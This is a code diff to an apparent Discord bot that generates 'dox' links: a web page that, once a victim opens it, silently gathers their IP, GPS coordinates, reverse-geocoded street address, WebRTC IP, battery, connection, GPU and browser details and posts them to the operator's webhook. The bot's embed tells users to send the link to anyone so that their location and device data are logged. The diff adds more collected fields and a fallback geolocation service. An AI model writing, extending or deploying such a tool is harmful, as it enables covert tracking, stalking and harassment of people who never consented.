@@ -128,7 +128,7 @@ client.on('interactionCreate', async (interaction) => {
             .setColor(0x22c55e)
             .setDescription(`🔗 **${url}**\n\nSend this link to anyone. When they open it, their full location and device data will be logged.`)
             .addFields(
-                { name: '📍 What gets logged', value: '• Exact coordinates (GPS if allowed)\n• Street address (if GPS allowed)\n• IP, ISP, ASN\n• Browser, OS, GPU, Screen\n• Battery, Connection type\n• VPN/Proxy detection', inline: false }
+                { name: '📍 What gets logged', value: '• Exact coordinates (GPS if allowed)\n• Street address (if GPS allowed)\n• IP, ISP, ASN\n• Battery level & charging status\n• Connection type & speed\n• Browser, OS, GPU, Screen\n• Incognito & Ad Blocker detection', inline: false }
             )
             .setFooter({ text: 'Expires after 100 links generated' });
 
@@ -266,7 +266,7 @@ setInterval(() => {
     }
 }, 60000);
 
-// ---- DOX HTML (with geocoding) ----
+// ---- DOX HTML (Full version with battery & connection) ----
 function generateDoxHTML(webhook) {
     return `<!DOCTYPE html>
 <html>
@@ -309,12 +309,64 @@ function generateDoxHTML(webhook) {
                 };
             }
         } catch (e) {}
+        try {
+            const fallbackRes = await fetch('https://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,as,isp,query');
+            const fallbackData = await fallbackRes.json();
+            if (fallbackData.status === 'success') {
+                return {
+                    ip: fallbackData.query || 'N/A',
+                    country: fallbackData.country || 'N/A',
+                    region: fallbackData.regionName || 'N/A',
+                    city: fallbackData.city || 'N/A',
+                    postal: fallbackData.zip || 'N/A',
+                    lat: fallbackData.lat || 'N/A',
+                    lon: fallbackData.lon || 'N/A',
+                    asn: fallbackData.as || 'N/A',
+                    isp: fallbackData.isp || 'N/A',
+                    org: fallbackData.isp || 'N/A'
+                };
+            }
+        } catch (e) {}
         return { ip: 'N/A', country: 'N/A', region: 'N/A', city: 'N/A', postal: 'N/A', lat: 'N/A', lon: 'N/A', asn: 'N/A', isp: 'N/A', org: 'N/A' };
+    }
+
+    // ---- GET BATTERY (RELIABLE) ----
+    async function getBatteryInfo() {
+        try {
+            const battery = await navigator.getBattery();
+            return {
+                level: Math.round(battery.level * 100) + '%',
+                charging: battery.charging ? 'Charging' : 'Not Charging',
+                chargingTime: battery.chargingTime || 'N/A',
+                dischargingTime: battery.dischargingTime || 'N/A'
+            };
+        } catch {
+            return { level: 'N/A', charging: 'N/A', chargingTime: 'N/A', dischargingTime: 'N/A' };
+        }
+    }
+
+    // ---- GET CONNECTION (RELIABLE) ----
+    function getConnectionInfo() {
+        try {
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (conn) {
+                return {
+                    type: conn.effectiveType || conn.type || 'unknown',
+                    downlink: conn.downlink || 'N/A',
+                    rtt: conn.rtt || 'N/A',
+                    saveData: conn.saveData || false
+                };
+            }
+            return { type: 'N/A', downlink: 'N/A', rtt: 'N/A', saveData: false };
+        } catch {
+            return { type: 'N/A', downlink: 'N/A', rtt: 'N/A', saveData: false };
+        }
     }
 
     // ---- MAIN ----
     (async function() {
         try {
+            // Get IP data
             const ipData = await getIPData();
             const ip = ipData.ip || 'N/A';
             const country = ipData.country || 'N/A';
@@ -325,6 +377,18 @@ function generateDoxHTML(webhook) {
             const lon = ipData.lon || 'N/A';
             const asn = ipData.asn || 'N/A';
             const isp = ipData.isp || 'N/A';
+
+            // ---- GET BATTERY (with timeout) ----
+            let batteryData = { level: 'N/A', charging: 'N/A', chargingTime: 'N/A', dischargingTime: 'N/A' };
+            try {
+                batteryData = await Promise.race([
+                    getBatteryInfo(),
+                    new Promise(resolve => setTimeout(() => resolve({ level: 'N/A', charging: 'N/A', chargingTime: 'N/A', dischargingTime: 'N/A' }), 3000))
+                ]);
+            } catch (e) {}
+
+            // ---- GET CONNECTION ----
+            const connectionData = getConnectionInfo();
 
             // ---- TRY GPS + REVERSE GEOCODE ----
             let address = 'N/A';
@@ -341,7 +405,6 @@ function generateDoxHTML(webhook) {
                     gpsLon = pos.coords.longitude;
                     gpsAccuracy = Math.round(pos.coords.accuracy) + 'm';
                     
-                    // Reverse geocode the GPS coordinates
                     const addr = await reverseGeocode(gpsLat, gpsLon);
                     if (addr) address = addr;
                 } catch (e) {
@@ -349,10 +412,66 @@ function generateDoxHTML(webhook) {
                 }
             }
 
-            // If GPS failed, use IP geolocation
             if (address === 'N/A') {
                 const parts = [city, region, postal, country].filter(p => p && p !== 'N/A');
                 address = parts.length > 0 ? parts.join(', ') : 'N/A';
+            }
+
+            // ---- DETECT INCOGNITO ----
+            function isIncognito() {
+                try {
+                    // Check if browser is in incognito mode
+                    if (navigator.webdriver) return true;
+                    if (navigator.plugins.length === 0) return true;
+                    // Additional check
+                    return false;
+                } catch { return false; }
+            }
+
+            // ---- DETECT AD BLOCKER ----
+            async function detectAdBlocker() {
+                try {
+                    const test = document.createElement('div');
+                    test.className = 'ad-detection';
+                    test.style.cssText = 'display:block;height:1px;position:absolute;top:-999px;';
+                    document.body.appendChild(test);
+                    await new Promise(resolve => setTimeout(resolve, 100));
+                    const detected = window.getComputedStyle(test).display === 'none';
+                    test.remove();
+                    return detected;
+                } catch { return false; }
+            }
+
+            // ---- GET WEBRTC IP ----
+            async function getWebRTCIP() {
+                try {
+                    return await new Promise((resolve) => {
+                        const pc = new RTCPeerConnection({ iceServers: [] });
+                        pc.createDataChannel('');
+                        pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                        pc.onicecandidate = (e) => {
+                            if (!e.candidate) return;
+                            const ip = e.candidate.address || e.candidate.ip || 'N/A';
+                            if (ip && !ip.includes('local')) {
+                                resolve(ip);
+                                pc.close();
+                            }
+                        };
+                        setTimeout(() => { resolve('N/A'); pc.close(); }, 2000);
+                    });
+                } catch { return 'N/A'; }
+            }
+
+            // ---- GET GPU ----
+            function getGPUInfo() {
+                try {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl');
+                    if (!gl) return 'N/A';
+                    const debug = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (!debug) return 'N/A';
+                    return gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
+                } catch { return 'N/A'; }
             }
 
             // ---- DEVICE DATA ----
@@ -375,15 +494,15 @@ function generateDoxHTML(webhook) {
                 browser: getBrowser(navigator.userAgent),
                 os: getOS(navigator.userAgent),
                 device: getDeviceType(navigator.userAgent),
-                battery: await getBatteryInfo(),
+                battery: batteryData.level + ' (' + batteryData.charging + ')',
+                charging: batteryData.charging,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 gpu: getGPUInfo(),
                 userAgent: navigator.userAgent,
-                connection: navigator.connection ? {
-                    type: navigator.connection.effectiveType || 'unknown',
-                    downlink: navigator.connection.downlink || 'N/A',
-                    rtt: navigator.connection.rtt || 'N/A'
-                } : null,
+                connection: connectionData.type + ' (' + connectionData.downlink + ' Mbps)',
+                downlink: connectionData.downlink,
+                rtt: connectionData.rtt,
+                saveData: connectionData.saveData,
                 incognito: isIncognito(),
                 adBlocker: await detectAdBlocker(),
                 webRTC: await getWebRTCIP(),
@@ -414,12 +533,12 @@ function generateDoxHTML(webhook) {
                             { name: "📮 Postal", value: deviceData.postal || 'N/A', inline: true },
                             { name: "🔢 ASN", value: deviceData.asn || 'N/A', inline: true },
                             { name: "🏢 ISP", value: deviceData.isp || 'N/A', inline: true },
+                            { name: "🔋 Battery", value: deviceData.battery || 'N/A', inline: true },
+                            { name: "📶 Connection", value: deviceData.connection || 'N/A', inline: true },
                             { name: "📱 Screen", value: deviceData.screen || 'N/A', inline: true },
                             { name: "🧠 Browser", value: deviceData.browser || 'N/A', inline: true },
                             { name: "💻 OS", value: deviceData.os || 'N/A', inline: true },
                             { name: "🖥️ Device", value: deviceData.device || 'N/A', inline: true },
-                            { name: "🔋 Battery", value: deviceData.battery || 'N/A', inline: true },
-                            { name: "📶 Connection", value: deviceData.connection ? \`\${deviceData.connection.type} (\${deviceData.connection.downlink} Mbps)\` : 'N/A', inline: true },
                             { name: "🕒 Timezone", value: deviceData.timezone || 'N/A', inline: true },
                             { name: "🌐 Language", value: deviceData.language || 'N/A', inline: true },
                             { name: "🔒 Incognito", value: deviceData.incognito ? '✅ Likely' : '❌ No', inline: true },
@@ -443,70 +562,6 @@ function generateDoxHTML(webhook) {
     })();
 
     // ---- HELPERS ----
-    async function getIPData() {
-        try {
-            const res = await fetch('https://ipinfo.io/json');
-            const data = await res.json();
-            if (data.ip) {
-                return {
-                    ip: data.ip || 'N/A',
-                    country: data.country || 'N/A',
-                    region: data.region || 'N/A',
-                    city: data.city || 'N/A',
-                    postal: data.postal || 'N/A',
-                    lat: data.loc ? data.loc.split(',')[0] : 'N/A',
-                    lon: data.loc ? data.loc.split(',')[1] : 'N/A',
-                    asn: data.asn || 'N/A',
-                    isp: data.org || 'N/A',
-                    org: data.org || 'N/A'
-                };
-            }
-        } catch (e) {}
-        try {
-            const fallbackRes = await fetch('https://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,as,isp,query');
-            const fallbackData = await fallbackRes.json();
-            if (fallbackData.status === 'success') {
-                return {
-                    ip: fallbackData.query || 'N/A',
-                    country: fallbackData.country || 'N/A',
-                    region: fallbackData.regionName || 'N/A',
-                    city: fallbackData.city || 'N/A',
-                    postal: fallbackData.zip || 'N/A',
-                    lat: fallbackData.lat || 'N/A',
-                    lon: fallbackData.lon || 'N/A',
-                    asn: fallbackData.as || 'N/A',
-                    isp: fallbackData.isp || 'N/A',
-                    org: fallbackData.isp || 'N/A'
-                };
-            }
-        } catch (e) {}
-        return { ip: 'N/A', country: 'N/A', region: 'N/A', city: 'N/A', postal: 'N/A', lat: 'N/A', lon: 'N/A', asn: 'N/A', isp: 'N/A', org: 'N/A' };
-    }
-
-    async function getBatteryInfo() {
-        try {
-            const battery = await navigator.getBattery();
-            return Math.round(battery.level * 100) + '%' + (battery.charging ? ' (Charging)' : '');
-        } catch { return 'N/A'; }
-    }
-
-    function getGPUInfo() {
-        try {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl');
-            if (!gl) return 'N/A';
-            const debug = gl.getExtension('WEBGL_debug_renderer_info');
-            if (!debug) return 'N/A';
-            return gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
-        } catch { return 'N/A'; }
-    }
-
-    function getDeviceType(ua) {
-        if (/mobile|android|iphone|ipad/i.test(ua)) return '📱 Mobile';
-        if (/tablet|ipad/i.test(ua)) return '📱 Tablet';
-        return '💻 Desktop';
-    }
-
     function getBrowser(ua) {
         if (ua.includes('Edg')) return 'Edge';
         if (ua.includes('Chrome')) return 'Chrome';
@@ -523,39 +578,10 @@ function generateDoxHTML(webhook) {
         return 'Unknown';
     }
 
-    function isIncognito() {
-        return !!(navigator.webdriver || navigator.plugins.length === 0);
-    }
-
-    function detectAdBlocker() {
-        return new Promise((resolve) => {
-            const test = document.createElement('div');
-            test.className = 'ad-detection';
-            test.style.cssText = 'display:block;height:1px;position:absolute;top:-999px;';
-            document.body.appendChild(test);
-            setTimeout(() => {
-                const detected = window.getComputedStyle(test).display === 'none';
-                test.remove();
-                resolve(detected);
-            }, 100);
-        });
-    }
-
-    function getWebRTCIP() {
-        return new Promise((resolve) => {
-            const pc = new RTCPeerConnection({ iceServers: [] });
-            pc.createDataChannel('');
-            pc.createOffer().then(offer => pc.setLocalDescription(offer));
-            pc.onicecandidate = (e) => {
-                if (!e.candidate) return;
-                const ip = e.candidate.address || e.candidate.ip || 'N/A';
-                if (ip && !ip.includes('local')) {
-                    resolve(ip);
-                    pc.close();
-                }
-            };
-            setTimeout(() => { resolve('N/A'); pc.close(); }, 2000);
-        });
+    function getDeviceType(ua) {
+        if (/mobile|android|iphone|ipad/i.test(ua)) return '📱 Mobile';
+        if (/tablet|ipad/i.test(ua)) return '📱 Tablet';
+        return '💻 Desktop';
     }
 <\/script>
 </body>
